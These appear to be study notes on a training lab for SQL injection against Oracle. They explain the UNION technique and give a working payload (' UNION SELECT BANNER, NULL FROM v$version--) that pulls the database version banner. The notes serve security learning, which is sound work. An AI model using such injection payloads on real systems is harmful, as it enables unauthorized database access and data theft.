#### Lab: SQL injection attack, querying the database type and version on Oracle

Require of lab:
> Make the database retrieve the strings: 'Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production, PL/SQL Release 11.2.0.2.0 - Production, CORE 11.2.0.2.0 Production, TNS for Linux: Version 11.2.0.2.0 - Production, NLSRTL Version 11.2.0.2.0 - Production'

The SQL UNION operator is used to combine the result-set of two or more SELECT statement
We use UNION operator to let our sql statement bind to the page's sql statement

Query database version of Oracle:
>SELECT banner FROM v$version

Check number of columns that are being return by the query => Number of columns = 2
![](../../Img_note/Pasted%20image%2020221207131757.png)

Add query database version of orcale to the url
> ' UNION SELECT BANNER, NULL FROM v$version--

Add **'** to end the statement is called, add **--** to comment the the rest of the statement is called. And now we have information of the database
![](../../Img_note/Pasted%20image%2020221207132839.png)
